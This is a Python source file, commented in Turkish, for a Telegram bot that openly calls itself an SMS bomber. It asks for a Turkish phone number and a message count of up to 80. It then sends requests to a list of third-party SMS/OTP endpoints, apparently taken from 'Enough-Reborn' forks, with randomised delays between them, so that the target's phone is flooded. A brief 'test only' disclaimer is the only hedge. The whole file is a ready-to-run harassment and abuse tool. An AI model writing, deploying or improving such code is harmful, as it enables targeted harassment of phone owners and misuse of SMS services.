# main.py
# Enough-Reborn mantığı + Telegram bot + syntax temiz + MarkdownV2 güvenli
# 21 Mart 2026 - deploy edilebilir hali

import asyncio
import logging
import os
import random
from datetime import datetime

import httpx
from dotenv import load_dotenv
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

logging.basicConfig(
    format='%(asctime)s | %(levelname)s | %(message)s',
    level=logging.INFO,
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN ortam değişkeni yok!")

# Enough-Reborn ve fork'larından (allahnumberone/enough-V2, tingirifistik vs.) derlenmiş servisler
# 2026'da hâlâ kısmen yaşayan Türkiye odaklı olanlar + birkaç yedek
SERVICES = [
    {"name": "kandilli",       "url": "https://api.kandilli.info/sms",        "method": "GET",  "params": {"phone": "{phone}", "amount": "{count}"}},
    {"name": "sms24-vercel",   "url": "https://sms24api.vercel.app/send",     "method": "GET",  "params": {"to": "{phone}", "count": "{count}"}},
    {"name": "temp-number",    "url": "https://temp-number.org/api/sms",      "method": "GET",  "params": {"number": "{phone}", "amount": "{count}"}},
    {"name": "enough-otp-1",   "url": "https://api.enough.reborn.tr/otp",     "method": "GET",  "params": {"tel": "{phone}"}},
    {"name": "tr-yedek-1",     "url": "https://otp.xn--sms-0ra.net/send",     "method": "GET",  "params": {"phone": "{phone}"}},
]

MAX_COUNT = 80
REQUEST_TIMEOUT = 10.0
DELAY_BETWEEN = (0.9, 3.5)

def md_safe(s: str) -> str:
    """MarkdownV2 için rezerv karakterleri otomatik kaçır"""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + c if c in escape_chars else c for c in s)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = md_safe(
        "💥 Enough tarzı SMS Bomber - Basit versiyon\n\n"
        "/sms → numarayı ve adedi yaz, hemen başlasın\n"
        "/cancel → iptal\n\n"
        "⚠ Sadece test amaçlı. Yasal sorumluluk sende."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)


async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = md_safe(
        "📱 Numarayı gir\n"
        "Örnek: 5391234567 veya 905391234567\n"
        "\\(0 ile başlasan da otomatik +90 olur\\)"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
    context.user_data["state"] = "phone"


async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    if not state:
        return

    text = update.message.text.strip()

    if state == "phone":
        phone = ''.join(c for c in text if c.isdigit())
        if phone.startswith('0'):
            phone = '90' + phone[1:]
        elif len(phone) == 10:
            phone = '90' + phone

        if len(phone) != 12 or not phone.startswith('90'):
            await update.message.reply_text(md_safe("❌ Numara hatalı. Tekrar dene."), parse_mode=ParseMode.MARKDOWN_V2)
            return

        context.user_data["phone"] = phone
        context.user_data["state"] = "count"

        msg = md_safe(
            f"✅ Numara alındı: `{phone}`\n\n"
            f"🔥 Kaç adet göndereyim? \\(max {MAX_COUNT}\\)"
        )
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)

    elif state == "count":
        try:
            count = int(text)
            if count < 1 or count > MAX_COUNT:
                await update.message.reply_text(md_safe(f"1 ile {MAX_COUNT} arası sayı gir."), parse_mode=ParseMode.MARKDOWN_V2)
                return
        except ValueError:
            await update.message.reply_text(md_safe("Sayı gir lan."), parse_mode=ParseMode.MARKDOWN_V2)
            return

        context.user_data["count"] = count
        context.user_data["state"] = None

        phone = context.user_data["phone"]
        msg = md_safe(
            f"🚀 Başlatılıyor...\n"
            f"Numara → `{phone}`\n"
            f"Adet   → `{count}`\n"
            f"Bekle..."
        )
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)

        success, used_service = await send_sms(phone, count)

        if success:
            reply = md_safe(
                f"✅ Gönderildi!\n"
                f"Servis → `{used_service}`\n"
                f"Numara → `{phone}`\n"
                f"Adet   → `{count}`\n"
                f"{datetime.now().strftime('%H:%M:%S')}"
            )
        else:
            reply = md_safe(
                f"❌ Hiçbir servis çalışmadı\n"
                f"Numara → `{phone}`\n"
                f"Adet   → `{count}`\n"
                f"Servisler büyük ihtimalle ölmüş. GitHub'da yeni fork ara."
            )

        await update.message.reply_text(reply, parse_mode=ParseMode.MARKDOWN_V2)


async def send_sms(phone: str, count: int) -> tuple[bool, str]:
    async with httpx.AsyncClient(http2=True, follow_redirects=True) as client:
        for service in SERVICES:
            try:
                url = service["url"]
                if service["method"] == "GET":
                    params = {k: v.format(phone=phone, count=count) for k, v in service.get("params", {}).items()}
                    r = await client.get(url, params=params, timeout=REQUEST_TIMEOUT)
                elif service["method"] == "POST":
                    json_data = {k: v.format(phone=phone, count=count) for k, v in service.get("json", {}).items()}
                    r = await client.post(url, json=json_data, timeout=REQUEST_TIMEOUT)
                else:
                    continue

                if r.status_code in (200, 201, 202):
                    logger.info(f"{service['name']} → OK | {r.text[:100]}")
                    await asyncio.sleep(random.uniform(*DELAY_BETWEEN))
                    return True, service["name"]

                logger.warning(f"{service['name']} → {r.status_code} | {r.text[:120]}")
                await asyncio.sleep(random.uniform(*DELAY_BETWEEN))

            except Exception as e:
                logger.error(f"{service.get('name', 'Servis')} hata: {e}")

    return False, "hepsi başarısız"


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).read_timeout(45).write_timeout(45).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sms", sms))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("Enough mantığı bot başladı — /sms ile dene")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
